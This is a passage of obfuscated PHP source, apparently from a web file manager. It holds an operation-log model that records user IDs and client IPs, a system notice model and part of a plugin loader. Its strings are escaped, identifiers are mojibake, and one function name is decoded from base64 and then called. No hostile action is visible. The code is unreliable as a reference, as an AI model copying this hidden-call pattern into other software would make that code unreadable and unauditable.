array(array("\143\x72\145\x61\164\x65\x54\151\155\145", "\x74\151\x6d\145", "\x69\156\163\145\162\x74", "\x66\x75\156\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ƒ£…ã¼¿ =& $_SERVER[Á÷ ­Šë]; return array($ƒ£…ã¼¿[2058] => LNG($ƒ£…ã¼¿[2059]), $ƒ£…ã¼¿[2060] => LNG($ƒ£…ã¼¿[2061]), $ƒ£…ã¼¿[1684] => LNG($ƒ£…ã¼¿[2062]), $ƒ£…ã¼¿[2063] => LNG($ƒ£…ã¼¿[2064]), $ƒ£…ã¼¿[2065] => LNG($ƒ£…ã¼¿[2066]), $ƒ£…ã¼¿[2067] => LNG($ƒ£…ã¼¿[2068]), $ƒ£…ã¼¿[2069] => LNG($ƒ£…ã¼¿[2070]), $ƒ£…ã¼¿[1714] => LNG($ƒ£…ã¼¿[2070]), $ƒ£…ã¼¿[1715] => LNG($ƒ£…ã¼¿[2071]), $ƒ£…ã¼¿[2072] => LNG($ƒ£…ã¼¿[2073]), $ƒ£…ã¼¿[2074] => LNG($ƒ£…ã¼¿[2075]), $ƒ£…ã¼¿[2076] => LNG($ƒ£…ã¼¿[2077]), $ƒ£…ã¼¿[2078] => LNG($ƒ£…ã¼¿[2079]), $ƒ£…ã¼¿[1712] => LNG($ƒ£…ã¼¿[2080]), $ƒ£…ã¼¿[2081] => LNG($ƒ£…ã¼¿[2082]), $ƒ£…ã¼¿[1719] => LNG($ƒ£…ã¼¿[2083]), $ƒ£…ã¼¿[2084] => LNG($ƒ£…ã¼¿[2085]), $ƒ£…ã¼¿[2086] => LNG($ƒ£…ã¼¿[2087]), $ƒ£…ã¼¿[2088] => LNG($ƒ£…ã¼¿[2089]), $ƒ£…ã¼¿[2090] => LNG($ƒ£…ã¼¿[2091]), $ƒ£…ã¼¿[1722] => LNG($ƒ£…ã¼¿[2092]), $ƒ£…ã¼¿[1723] => LNG($ƒ£…ã¼¿[2093]), $ƒ£…ã¼¿[2094] => LNG($ƒ£…ã¼¿[2095]), $ƒ£…ã¼¿[2096] => LNG($ƒ£…ã¼¿[2097]), $ƒ£…ã¼¿[2098] => LNG($ƒ£…ã¼¿[2099]), $ƒ£…ã¼¿[1717] => LNG($ƒ£…ã¼¿[2100]), $ƒ£…ã¼¿[2101] => LNG($ƒ£…ã¼¿[2102]), $ƒ£…ã¼¿[1716] => LNG($ƒ£…ã¼¿[2103]), $ƒ£…ã¼¿[2104] => LNG($ƒ£…ã¼¿[2105]), $ƒ£…ã¼¿[2106] => LNG($ƒ£…ã¼¿[2107]), $ƒ£…ã¼¿[2108] => LNG($ƒ£…ã¼¿[2109]), $ƒ£…ã¼¿[2110] => LNG($ƒ£…ã¼¿[2110]), $ƒ£…ã¼¿[2111] => LNG($ƒ£…ã¼¿[1688]), $ƒ£…ã¼¿[2112] => LNG($ƒ£…ã¼¿[2113]), $ƒ£…ã¼¿[2114] => LNG($ƒ£…ã¼¿[2115]), $ƒ£…ã¼¿[2116] => LNG($ƒ£…ã¼¿[2117]), $ƒ£…ã¼¿[2118] => LNG($ƒ£…ã¼¿[2119]), $ƒ£…ã¼¿[2120] => LNG($ƒ£…ã¼¿[2121]), $ƒ£…ã¼¿[2122] => LNG($ƒ£…ã¼¿[2122]), $ƒ£…ã¼¿[2123] => LNG($ƒ£…ã¼¿[2124]), $ƒ£…ã¼¿[2125] => LNG($ƒ£…ã¼¿[2126]), $ƒ£…ã¼¿[2127] => LNG($ƒ£…ã¼¿[2128]), $ƒ£…ã¼¿[2129] => LNG($ƒ£…ã¼¿[2130]), $ƒ£…ã¼¿[2131] => LNG($ƒ£…ã¼¿[2132]), $ƒ£…ã¼¿[2133] => LNG($ƒ£…ã¼¿[2134])); } private function typeFile() { $«îëÀÃò =& $_SERVER[Á÷ ­Šë]; $Ù±§á¯ = array($«îëÀÃò[1719] => array($«îëÀÃò[1720]), $«îëÀÃò[2076] => array($«îëÀÃò[2135]), $«îëÀÃò[2078] => array($«îëÀÃò[2136]), $«îëÀÃò[1712] => array($«îëÀÃò[1713]), $«îëÀÃò[2086] => array(), $«îëÀÃò[2088] => array(), $«îëÀÃò[2090] => array(), $«îëÀÃò[1722] => array($«îëÀÃò[1724]), $«îëÀÃò[1723] => array($«îëÀÃò[1724]), $«îëÀÃò[2094] => array($«îëÀÃò[2137]), $«îëÀÃò[2096] => array($«îëÀÃò[2137]), $«îëÀÃò[2098] => array($«îëÀÃò[2138]), $«îëÀÃò[2084] => array($«îëÀÃò[2139]), $«îëÀÃò[1717] => array($«îëÀÃò[2140]), $«îëÀÃò[2101] => array($«îëÀÃò[2141]), $«îëÀÃò[1716] => array($«îëÀÃò[1718])); return $Ù±§á¯; } private function typeAll() { $âÇËÇ§¹ =& $_SERVER[Á÷ ­Šë]; $¯…ê« = $this->typeList; $šØÏü«· = array_filter($this->typeFile()); foreach ($šØÏü«· as $“ûŸñ => $Ûì˜²ºè) { $¯…ê«[$Ûì˜²ºè[0]] = $¯…ê«[$“ûŸñ]; } $¯…ê«[$âÇËÇ§¹[1724]] = LNG($âÇËÇ§¹[2142]); $¯…ê«[$âÇËÇ§¹[2137]] = LNG($âÇËÇ§¹[2143]); return $¯…ê«; } public function addLog($çàŠˆš÷, $²œ«ÎŸ’ = array()) { $Ú»»¹ùÀ =& $_SERVER[Á÷ ­Šë]; if (!isset($this->typeList[$çàŠˆš÷])) { return; } $¹‹Œ¤³Ü = defined($Ú»»¹ùÀ[478]) && USER_ID ? USER_ID : (isset($²œ«ÎŸ’[$Ú»»¹ùÀ[1574]]) ? $²œ«ÎŸ’[$Ú»»¹ùÀ[1574]] : 0); if (!$¹‹Œ¤³Ü) { $¹‹Œ¤³Ü = (int) Session::get($Ú»»¹ùÀ[1876]); } $ÍıÍ»‘é = get_client_ip(); if (!$²œ«ÎŸ’ || strlen(json_encode($²œ«ÎŸ’)) >= 1024) { $²œ«ÎŸ’ = array($Ú»»¹ùÀ[2144] => $ÍıÍ»‘é); } else { if (is_array($²œ«ÎŸ’)) { $²œ«ÎŸ’[$Ú»»¹ùÀ[2144]] = $ÍıÍ»‘é; } else { $²œ«ÎŸ’ = array($Ú»»¹ùÀ[1119] => $²œ«ÎŸ’, $Ú»»¹ùÀ[2144] => $ÍıÍ»‘é); } } $²œ«ÎŸ’ = array($Ú»»¹ùÀ[1564] => Session::sign(), $Ú»»¹ùÀ[1565] => $¹‹Œ¤³Ü, $Ú»»¹ùÀ[29] => $çàŠˆš÷, $Ú»»¹ùÀ[1567] => json_encode($²œ«ÎŸ’)); parent::add($²œ«ÎŸ’); } public function remove($†øÖ‘ëÏ) { $this->where(array($_SERVER[Á÷ ­Šë][424] => $†øÖ‘ëÏ))->delete(); } private function _makeOrder($ÛôœÖã = '') { $’Ö…Ûó =& $_SERVER[Á÷ ­Šë]; $Øß¤¤ÏÂ = $’Ö…Ûó[204]; $˜Ö¸ö˜î = array($’Ö…Ûó[452] => $’Ö…Ûó[453], $’Ö…Ûó[454] => $’Ö…Ûó[455]); $±—”© ì = Input::get($’Ö…Ûó[460], $’Ö…Ûó[7], $’Ö…Ûó[1908], array($’Ö…Ûó[1832], $’Ö…Ûó[454])); $±—”© ì = $˜Ö¸ö˜î[$±—”© ì]; $ÛôœÖã = $ÛôœÖã . "{$Øß¤¤ÏÂ}\x20{$±—”© ì}"; return $this->order($ÛôœÖã); } public function get($Ä¡®Ş¶ = '') { $õŞƒ½šÂ =& $_SERVER[Á÷ ­Šë]; if (!$Ä¡®Ş¶) { show_json(array()); } $šŸùªº± = array(); if ($Ä¡®Ş¶[$õŞƒ½šÂ[1574]]) { $šŸùªº±[$õŞƒ½šÂ[1574]] = $Ä¡®Ş¶[$õŞƒ½šÂ[1574]]; } if (isset($Ä¡®Ş¶[$õŞƒ½šÂ[756]])) { $úêüıâá = $Ä¡®Ş¶[$õŞƒ½šÂ[756]]; $¾£¢òäã = isset($Ä¡®Ş¶[$õŞƒ½šÂ[500]]) ? $Ä¡®Ş¶[$õŞƒ½šÂ[500]] : time(); $šŸùªº±[$õŞƒ½šÂ[204]] = array($õŞƒ½šÂ[340], array($úêüıâá, $¾£¢òäã)); } if ($Ä¡®Ş¶[$õŞƒ½šÂ[29]]) { $Ôˆ˜¯ÛÈ = explode($õŞƒ½šÂ[47], $Ä¡®Ş¶[$õŞƒ½šÂ[29]]); $ßµû‡œ‹ = $this->typeFile(); $Ü“ê¸ = array(); foreach ($Ôˆ˜¯ÛÈ as $¯†ëÒó§) { $Ü“ê¸[] = $¯†ëÒó§; if (isset($ßµû‡œ‹[$¯†ëÒó§])) { $Ü“ê¸ = array_merge($Ü“ê¸, $ßµû‡œ‹[$¯†ëÒó§]); } } $Ü“ê¸ = array_unique($Ü“ê¸); if ($Ü“ê¸) { $šŸùªº±[$õŞƒ½šÂ[29]] = array($õŞƒ½šÂ[7], $Ü“ê¸); } } else { $šŸùªº±[$õŞƒ½šÂ[29]] = array($õŞƒ½šÂ[2145], $õŞƒ½šÂ[2146]); } if (!empty($Ä¡®Ş¶[$õŞƒ½šÂ[2144]])) { $šŸùªº±[$õŞƒ½šÂ[455]] = array($õŞƒ½šÂ[390], "\x25{$Ä¡®Ş¶[$õŞƒ½šÂ[2144]]}\45"); } $©øú™‰£ = $this->_makeOrder()->where($šŸùªº±)->selectPage(); if (empty($©øú™‰£[$õŞƒ½šÂ[376]])) { show_json(array(), !0, $©øú™‰£[$õŞƒ½šÂ[373]]); } $©øú™‰£[$õŞƒ½šÂ[376]] = $this->logList($©øú™‰£[$õŞƒ½šÂ[376]]); return $©øú™‰£; } private function ipAddress(&$ÛøêŞö“) { $ªÏÜÍìñ =& $_SERVER[Á÷ ­Šë]; if (!empty($ÛøêŞö“[$ªÏÜÍìñ[2144]])) { $äß·ğûÒ = IpLocation::get($ÛøêŞö“[$ªÏÜÍìñ[2144]]); } else { $äß·ğûÒ = LNG($ªÏÜÍìñ[2147]); } $ÛøêŞö“[$ªÏÜÍìñ[2148]] = $äß·ğûÒ; } private function descZipDownload($÷±»Û”­, &$İ¬ĞÁ™Á) { $ÆßÊÄíÒ =& $_SERVER[Á÷ ­Šë]; if (!isset($÷±»Û”­[$ÆßÊÄíÒ[2149]])) { return; } $ÉÁòùÜ = json_decode($÷±»Û”­[$ÆßÊÄíÒ[2149]], !0); foreach ($ÉÁòùÜ as $º€Ëˆî¸) { try { $÷èİ…â = IO::infoFull($º€Ëˆî¸[$ÆßÊÄíÒ[86]]); } catch (Exception $²Ášàáó) { continue; } $÷±»Û”­[$ÆßÊÄíÒ[86]] = $º€Ëˆî¸[$ÆßÊÄíÒ[86]]; $İ¬ĞÁ™Á[] = $÷±»Û”­[$ÆßÊÄíÒ[407]] = $÷èİ…â[$ÆßÊÄíÒ[407]]; $İ¬ĞÁ™Á[] = $÷±»Û”­[$ÆßÊÄíÒ[1962]] = $÷èİ…â[$ÆßÊÄíÒ[502]]; break; } return $÷±»Û”­; } private function getSourceList(&$÷È†¥×) { $Ü–Ô¦â– =& $_SERVER[Á÷ ­Šë]; $ò¾œ÷Îğ = array(); foreach ($÷È†¥× as $è€Æí š => $¡ÑšœÚ) { $˜ÇİàŸÂ = json_decode($¡ÑšœÚ[$Ü–Ô¦â–[455]], !0); if ($¡ÑšœÚ[$Ü–Ô¦â–[29]] == $Ü–Ô¦â–[1715]) { $˜ÇİàŸÂ = $this->descZipDownload($˜ÇİàŸÂ, $ò¾œ÷Îğ); $÷È†¥×[$è€Æí š][$Ü–Ô¦â–[455]] = json_encode($˜ÇİàŸÂ); continue; } if (strpos($¡ÑšœÚ[$Ü–Ô¦â–[29]], $Ü–Ô¦â–[1963]) !== 0) { if (!isset($˜ÇİàŸÂ[$Ü–Ô¦â–[86]]) || strpos($¡ÑšœÚ[$Ü–Ô¦â–[29]], $Ü–Ô¦â–[2150]) !== 0) { continue; } try { $Çú«£¡ş = IO::infoFull($˜ÇİàŸÂ[$Ü–Ô¦â–[86]]); } catch (Exception $ÜÄºñîß) { continue; } $ò¾œ÷Îğ[] = $˜ÇİàŸÂ[$Ü–Ô¦â–[407]] = $Çú«£¡ş[$Ü–Ô¦â–[407]]; $ò¾œ÷Îğ[] = $˜ÇİàŸÂ[$Ü–Ô¦â–[1962]] = $Çú«£¡ş[$Ü–Ô¦â–[502]]; $÷È†¥×[$è€Æí š][$Ü–Ô¦â–[455]] = json_encode($˜ÇİàŸÂ); continue; } $ò¾œ÷Îğ[] = $˜ÇİàŸÂ[$Ü–Ô¦â–[407]]; $ò¾œ÷Îğ[] = $˜ÇİàŸÂ[$Ü–Ô¦â–[1962]]; if ($˜ÇİàŸÂ[$Ü–Ô¦â–[29]] == $Ü–Ô¦â–[555]) { $ò¾œ÷Îğ[] = $˜ÇİàŸÂ[$Ü–Ô¦â–[455]][$Ü–Ô¦â–[1086]]; $ò¾œ÷Îğ[] = $˜ÇİàŸÂ[$Ü–Ô¦â–[455]][$Ü–Ô¦â–[1087]]; } if ($˜ÇİàŸÂ[$Ü–Ô¦â–[29]] == $Ü–Ô¦â–[1970]) { $ò¾œ÷Îğ[] = $˜ÇİàŸÂ[$Ü–Ô¦â–[455]][$Ü–Ô¦â–[407]]; } } if (!$ò¾œ÷Îğ) { return array(); } return Model($Ü–Ô¦â–[827])->sourceListInfo($ò¾œ÷Îğ, !0); } private function logList($Ë‘‡…™è) { $Ô¶˜»‚® =& $_SERVER[Á÷ ­Šë]; $©¦·ª = array_to_keyvalue($Ë‘‡…™è, $Ô¶˜»‚®[33], $Ô¶˜»‚®[1574]); $ûá°©ø¢ = Model($Ô¶˜»‚®[542])->userListInfo(array_unique($©¦·ª)); $ÛëØ’É = $this->getSourceList($Ë‘‡…™è); $ß’èÂ÷¡ = $this->typeAll(); $¬£Üä•Ó = array(); $©áÅæö = array(); foreach ($Ë‘‡…™è as $®¢Áã => $Í‘’ê¹æ) { $È¦‘€ÚÛ = $Í‘’ê¹æ[$Ô¶˜»‚®[29]]; $Åáš¡ÊÜ = isset($ûá°©ø¢[$Í‘’ê¹æ[$Ô¶˜»‚®[1574]]]) ? $ûá°©ø¢[$Í‘’ê¹æ[$Ô¶˜»‚®[1574]]] : !1; $¹Á˜Û±² = strpos($È¦‘€ÚÛ, $Ô¶˜»‚®[2151]) === 0 ? LNG($Ô¶˜»‚®[2152]) : LNG($Ô¶˜»‚®[2147]); $Í‘’ê¹æ[$Ô¶˜»‚®[28]] = isset($Åáš¡ÊÜ[$Ô¶˜»‚®[28]]) ? $Åáš¡ÊÜ[$Ô¶˜»‚®[28]] : LNG($Ô¶˜»‚®[2147]); $Í‘’ê¹æ[$Ô¶˜»‚®[2010]] = isset($Åáš¡ÊÜ[$Ô¶˜»‚®[2010]]) ? $Åáš¡ÊÜ[$Ô¶˜»‚®[2010]] : $Ô¶˜»‚®[33]; $Í‘’ê¹æ[$Ô¶˜»‚®[1474]] = isset($ß’èÂ÷¡[$È¦‘€ÚÛ]) ? $ß’èÂ÷¡[$È¦‘€ÚÛ] : $¹Á˜Û±²; $Í‘’ê¹æ[$Ô¶˜»‚®[1907]] = $Åáš¡ÊÜ; $òÎ¡°˜ = json_decode($Í‘’ê¹æ[$Ô¶˜»‚®[455]], !0); $Í‘’ê¹æ[$Ô¶˜»‚®[2144]] = isset($òÎ¡°˜[$Ô¶˜»‚®[2144]]) ? $òÎ¡°˜[$Ô¶˜»‚®[2144]] : $Ô¶˜»‚®[33]; $Í‘’ê¹æ[$Ô¶˜»‚®[2148]] = IpLocation::get($Í‘’ê¹æ[$Ô¶˜»‚®[2144]]); if (strpos($È¦‘€ÚÛ, $Ô¶˜»‚®[1963]) === 0 || isset($òÎ¡°˜[$Ô¶˜»‚®[1962]])) { $òÎ¡°˜[$Ô¶˜»‚®[95]] = $ÛëØ’É[$òÎ¡°˜[$Ô¶˜»‚®[407]]]; $òÎ¡°˜[$Ô¶˜»‚®[1975]] = $ÛëØ’É[$òÎ¡°˜[$Ô¶˜»‚®[1962]]]; if ($òÎ¡°˜[$Ô¶˜»‚®[29]] == $Ô¶˜»‚®[555]) { $òÎ¡°˜[$Ô¶˜»‚®[455]][$Ô¶˜»‚®[1086]] = $ÛëØ’É[$òÎ¡°˜[$Ô¶˜»‚®[455]][$Ô¶˜»‚®[1086]]]; $òÎ¡°˜[$Ô¶˜»‚®[455]][$Ô¶˜»‚®[1087]] = $ÛëØ’É[$òÎ¡°˜[$Ô¶˜»‚®[455]][$Ô¶˜»‚®[1087]]]; } if ($òÎ¡°˜[$Ô¶˜»‚®[29]] == $Ô¶˜»‚®[1970]) { $òÎ¡°˜[$Ô¶˜»‚®[455]][$Ô¶˜»‚®[407]] = $ÛëØ’É[$òÎ¡°˜[$Ô¶˜»‚®[455]][$Ô¶˜»‚®[407]]]; } if ($òÎ¡°˜[$Ô¶˜»‚®[29]] == $Ô¶˜»‚®[1710]) { $òÎ¡°˜[$Ô¶˜»‚®[1975]] = $òÎ¡°˜[$Ô¶˜»‚®[95]]; $òÎ¡°˜[$Ô¶˜»‚®[1962]] = $òÎ¡°˜[$Ô¶˜»‚®[1975]][$Ô¶˜»‚®[407]]; $òÎ¡°˜[$Ô¶˜»‚®[95]] = !1; $òÎ¡°˜[$Ô¶˜»‚®[407]] = $Ô¶˜»‚®[33]; } if ($òÎ¡°˜[$Ô¶˜»‚®[95]] && $òÎ¡°˜[$Ô¶˜»‚®[95]][$Ô¶˜»‚®[416]] == $Ô¶˜»‚®[1202]) { $©áÅæö[] = $Í‘’ê¹æ[$Ô¶˜»‚®[404]]; unset($Ë‘‡…™è[$®¢Áã]); continue; } if ($òÎ¡°˜[$Ô¶˜»‚®[1975]] && $òÎ¡°˜[$Ô¶˜»‚®[1975]][$Ô¶˜»‚®[416]] == $Ô¶˜»‚®[1202]) { $©áÅæö[] = $Í‘’ê¹æ[$Ô¶˜»‚®[404]]; unset($Ë‘‡…™è[$®¢Áã]); continue; } } $Í‘’ê¹æ[$Ô¶˜»‚®[455]] = $òÎ¡°˜; unset($Í‘’ê¹æ[$Ô¶˜»‚®[2153]]); $¬£Üä•Ó[] = $Í‘’ê¹æ; } $this->clearSystemPathLog($©áÅæö); return $¬£Üä•Ó; } private function clearSystemPathLog($Ÿ£õäÜ–) { $êúËäğ =& $_SERVER[Á÷ ­Šë]; if (count($Ÿ£õäÜ–) == 0) { return; } $Š¶öÔŒ£ = array($êúËäğ[404] => array($êúËäğ[7], array_unique($Ÿ£õäÜ–))); $this->where($Š¶öÔŒ£)->delete(); } public function deviceList($™ÙÜÆ«¬, $ÅşŸ¼ÅÁ = 0) { $÷ã©û— =& $_SERVER[Á÷ ­Šë]; $ğÌ¶¬‡ = array($÷ã©û—[1574] => $™ÙÜÆ«¬, $÷ã©û—[204] => array($÷ã©û—[1006], $ÅşŸ¼ÅÁ), $÷ã©û—[29] => $÷ã©û—[1684]); $£Èì¼ø  = array(); $—Ñ•óë˜ = $this->field($÷ã©û—[2154])->where($ğÌ¶¬‡)->order($÷ã©û—[1973])->limit(50)->select(); foreach ($—Ñ•óë˜ as $Ô¿ğ˜¸ => $’¡øÊ‹Æ) { if ($Ô¿ğ˜¸ > 0 && abs($’¡øÊ‹Æ[$÷ã©û—[204]] - $—Ñ•óë˜[$Ô¿ğ˜¸ - 1][$÷ã©û—[204]]) < 5) { continue; } $ğáöµ¨˜ = json_decode($’¡øÊ‹Æ[$÷ã©û—[455]], !0); $’¡øÊ‹Æ[$÷ã©û—[2144]] = isset($ğáöµ¨˜[$÷ã©û—[2144]]) ? $ğáöµ¨˜[$÷ã©û—[2144]] : $÷ã©û—[33]; unset($ğáöµ¨˜[$÷ã©û—[2144]]); $Êëâ‡© = $this->deviceType($ğáöµ¨˜[$÷ã©û—[1964]]); if (isset($£Èì¼ø [$Êëâ‡©])) { continue; } $’¡øÊ‹Æ[$÷ã©û—[2148]] = IpLocation::get($’¡øÊ‹Æ[$÷ã©û—[2144]]); $’¡øÊ‹Æ[$÷ã©û—[455]] = $ğáöµ¨˜; $£Èì¼ø [$Êëâ‡©] = $’¡øÊ‹Æ; } return array_values($£Èì¼ø ); } public function deviceType($îŒş´Æ) { return $îŒş´Æ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\156\157\164\x69\143\x65\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\143\157\x6e\164\x65\x6e\x74", "\x61\165\x74\150", "\155\157\144\145", "\x74\x69\x6d\145", "\x74\x79\160\145", "\x6c\x65\166\145\154", "\145\156\x61\x62\x6c\x65", "\163\x6f\x72\164"); public function listData($ÛÃ¸¨ƒö = false, $®àû ô = "\163\157\162\x74", $Ó†°àúõ = false) { return parent::listData($ÛÃ¸¨ƒö, $®àû ô, $Ó†°àúõ); } public function add($¨ĞÁ¿÷°) { $€•ûï± =& $_SERVER[Á÷ ­Šë]; $¨Œ•‚¡Æ = time(); if ($¨ĞÁ¿÷°[$€•ûï±[12]] == $€•ûï±[2155]) { $¨Œ•‚¡Æ = strtotime($¨ĞÁ¿÷°[$€•ûï±[207]]); } $¨ĞÁ¿÷°[$€•ûï±[207]] = $¨Œ•‚¡Æ; return parent::insert($¨ĞÁ¿÷°); } public function update($¯¸şğ¦û, $ô«øë¶Ş) { $ºèûà…Š =& $_SERVER[Á÷ ­Šë]; $÷àŒÔ×ä = $this->listData($¯¸şğ¦û); if (!$÷àŒÔ×ä) { return !1; } $ÎŒ›õ¢í = time(); if ($ô«øë¶Ş[$ºèûà…Š[12]] == $ºèûà…Š[2155]) { $ÎŒ›õ¢í = strtotime($ô«øë¶Ş[$ºèûà…Š[207]]); } $ô«øë¶Ş[$ºèûà…Š[207]] = $ÎŒ›õ¢í; return parent::update($¯¸şğ¦û, $ô«øë¶Ş); } public function remove($«¡¶îƒ) { $æ­Âé = $this->listData($«¡¶îƒ); if (!$æ­Âé || $æ­Âé[$_SERVER[Á÷ ­Šë][1202]]) { return !1; } return parent::remove($«¡¶îƒ); } public function sort($“ê•øù÷, $ÊŞ¢¶à¥) { return parent::update($“ê•øù÷, $ÊŞ¢¶à¥); } public function enable($³å–ÌÙÊ, $Õ×ÜñØ) { return parent::update($³å–ÌÙÊ, array($_SERVER[Á÷ ­Šë][2156] => $Õ×ÜñØ)); } private function initUserOption() { $šö²î‚¨ =& $_SERVER[Á÷ ­Šë]; $this->optionType = $šö²î‚¨[2157]; $this->modelType = $šö²î‚¨[2158]; $this->field = array($šö²î‚¨[2159], $šö²î‚¨[28], $šö²î‚¨[207], $šö²î‚¨[29], $šö²î‚¨[2160], $šö²î‚¨[745], $šö²î‚¨[199]); } public function userNoticeGet($èÔûüÒë = false) { $this->initUserOption(); return parent::listData($èÔûüÒë, $_SERVER[Á÷ ­Šë][404], !0); } public function userNoticeAdd($ô°å¡¸œ) { $Ô¾¼ú„ =& $_SERVER[Á÷ ­Šë]; $this->initUserOption(); $®Ì¼ó˜¥ = $this->findByKey($Ô¾¼ú„[2159], $ô°å¡¸œ[$Ô¾¼ú„[404]]); if ($®Ì¼ó˜¥) { return !0; } $ìĞÅÑÃ» = array($Ô¾¼ú„[2159] => $ô°å¡¸œ[$Ô¾¼ú„[404]], $Ô¾¼ú„[28] => $ô°å¡¸œ[$Ô¾¼ú„[28]], $Ô¾¼ú„[207] => $ô°å¡¸œ[$Ô¾¼ú„[207]], $Ô¾¼ú„[29] => isset($ô°å¡¸œ[$Ô¾¼ú„[29]]) ? $ô°å¡¸œ[$Ô¾¼ú„[29]] : 1, $Ô¾¼ú„[2160] => isset($ô°å¡¸œ[$Ô¾¼ú„[2160]]) ? $ô°å¡¸œ[$Ô¾¼ú„[2160]] : 0, $Ô¾¼ú„[745] => 0, $Ô¾¼ú„[199] => 0); return parent::insert($ìĞÅÑÃ»); } public function userNoticeEdit($ß¦–«ô, $®ÙÛ¬‰Ÿ) { $this->initUserOption(); return parent::update($ß¦–«ô, $®ÙÛ¬‰Ÿ); } } goto E¼º®ğâ£¾; E‰ÙØç‚•: $fileSize = strrev(base64_decode($_SERVER[ãÎ±‚ñ°][0])); function binCheckNeq($”®ÚéËÔ, $ùµõ’¤ü) { return $”®ÚéËÔ != $ùµõ’¤ü; } $_SERVER[$_SERVER[ãÎ±‚ñ°][1]] = $fileSize($_SERVER[$_SERVER[ãÎ±‚ñ°][2]]); goto BÈİ¦õ­†å; BÈİ¦õ­†å: function binCheckBigger($çÁà†‚Ñ, $Ã›ƒ¶°Î) { return $çÁà†‚Ñ > $Ã›ƒ¶°Î; } $_SERVER[$_SERVER[ãÎ±‚ñ°][3]] = (base64_decode('Nzg3MA==')."\x37\x34")+0;$_s51p="6kig2z15t3jelvwd9fauypqh4cbo7nsm80xrl9z3efgbv8d4surypikactxj06nw1ohm7";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÌôÖ¨ÑÛ, $Âë·ÄØ“) { $‹¨­‘®ä =& $_SERVER[Á÷ ­Šë]; if (isset(self::$_methodList[$ÌôÖ¨ÑÛ])) { return @call_user_func_array(self::$_methodList[$ÌôÖ¨ÑÛ], $Âë·ÄØ“); } else { if (method_exists($this, $ÌôÖ¨ÑÛ)) { return call_user_func_array(array($this, $ÌôÖ¨ÑÛ), $Âë·ÄØ“); } else { think_exception(__CLASS__ . $‹¨­‘®ä[4] . $ÌôÖ¨ÑÛ . $‹¨­‘®ä[5]); } } } public static function __callStatic($ª¨ß¢€, $¾¦¤ÓÅÅ) { if (isset(self::$_methodListStatic[$ª¨ß¢€])) { return call_user_func_array(self::$_methodListStatic[$ª¨ß¢€], $¾¦¤ÓÅÅ); } else { if (method_exists(self, $ª¨ß¢€)) { return call_user_func_array(array(self, $ª¨ß¢€), $¾¦¤ÓÅÅ); } else { show_json("{$ª¨ß¢€}\x28\51\x20\156\x6f\x74\40\x65\170\x69\163\x74\73", !1); } } } public static function addMethod($ĞÁÓÖ¬¾, $‘Åè¥ã–) { self::$_methodList[$ĞÁÓÖ¬¾] = $‘Åè¥ã–; } public static function addMethodStatic($Ô¢•Š½, $ÀºõÒê) { self::$_methodListStatic[$Ô¢•Š½] = $ÀºõÒê; } } goto cæ³Õî‚‡; c¥Ø’¡Ğå: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\160\154\165\147\x69\x6e\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\x73\164\141\164\165\163", "\162\x65\x67\x69\x65\x73\x74", "\x63\x6f\x6e\146\x69\x67"); public function loadList($€º»Ä—Î = false) { $Ûîš¬‹÷ = array_to_keyvalue($this->listData(), $_SERVER[Á÷ ­Šë][28]); if ($€º»Ä—Î) { return $Ûîš¬‹÷[$€º»Ä—Î]; } return $Ûîš¬‹÷; } public function init() { $Í´ùÕ’ˆ =& $_SERVER[Á÷ ­Šë]; Hook::trigger($Í´ùÕ’ˆ[1861]); $´íÈ„Œß = $this->loadPluginList(); foreach ($´íÈ„Œß as $à‹£±·¦ => $±ÙÑÊº¼) { $¦˜±æ°û = $this->appAllow($à‹£±·¦, $±ÙÑÊº¼); if (!$¦˜±æ°û) { continue; } foreach ($±ÙÑÊº¼[$Í´ùÕ’ˆ[1862]] as $ôÙ£®Çí => $¬õè’™÷) { Hook::bind($ôÙ£®Çí, $¬õè’™÷); } } Hook::trigger($Í´ùÕ’ˆ[1863]); Hook::trigger(ACTION); } public function appAllow($„á¹ÅÜÊ, $á²ÍŒÅÍ, $„ñü§èª = true) { $ê»Õ‹†ß =& $_SERVER[Á÷ ­Šë]; $×éçÄ¡¯ = PLUGIN_DIR . $„á¹ÅÜÊ . $ê»Õ‹†ß[1864]; if (!is_array($á²ÍŒÅÍ) || !is_array($á²ÍŒÅÍ[$ê»Õ‹†ß[1862]]) || $á²ÍŒÅÍ[$ê»Õ‹†ß[745]] != 1 || !is_file($×éçÄ¡¯)) { return !1; } if ($GLOBALS[$ê»Õ‹†ß[509]] == 1) { return !0; } if ($„ñü§èª && !Action($ê»Õ‹†ß[1865])->checkAuth($„á¹ÅÜÊ)) { return !1; } return !0; } public function unInstall($Ò»¢´ùõ) { $ˆ‘¶óÖ„ =& $_SERVER[Á÷ ­Šë]; $²›³íÔ¾ = $this->loadList($Ò»¢´ùõ); if (file_exists(PLUGIN_DIR . $Ò»¢´ùõ)) { Hook::apply($Ò»¢´ùõ . $ˆ‘¶óÖ„[1866]); } $this->remove($²›³íÔ¾[$ˆ‘¶óÖ„[404]]); } public function changeStatus($ûĞüËÒ, $ª³ñ¹Á) { $ÓÙşªÃ =& $_SERVER[Á÷ ­Šë]; $¼€ÒäÑŸ = $this->loadList($ûĞüËÒ); if ($ª³ñ¹Á) { Hook::apply($ûĞüËÒ . $ÓÙşªÃ[1867]); } $this->update($¼€ÒäÑŸ[$ÓÙşªÃ[404]], array($ÓÙşªÃ[1868] => $ª³ñ¹Á)); } public function appRegist($ò´®Éê¢, $‘ ûüğ) { $ÒÊÇ‚â =& $_SERVER[Á÷ ­Šë]; $¶üúª¢´ = $this->loadList($ò´®Éê¢); if ($¶üúª¢´) { $this->update($¶üúª¢´[$ÒÊÇ‚â[404]], array($ÒÊÇ‚â[1862] => $‘ ûüğ)); } else { $è¨Û“ìÅ = array($ÒÊÇ‚â[28] => $ò´®Éê¢, $ÒÊÇ‚â[1862] => $‘ ûüğ, $ÒÊÇ‚â[745] => 0, $ÒÊÇ‚â[6] => $this->getConfigDefault($ò´®Éê¢)); $this->insert($è¨Û“ìÅ); } } public function getConfigDefault($ï›âÔÀ±) { $ ‹¾Ó Ì =& $_SERVER[Á÷ ­Šë]; $™¼ñ‘ = array(); $ıÓÕ¼¨– = $this->getPackageJson($ï›âÔÀ±); if 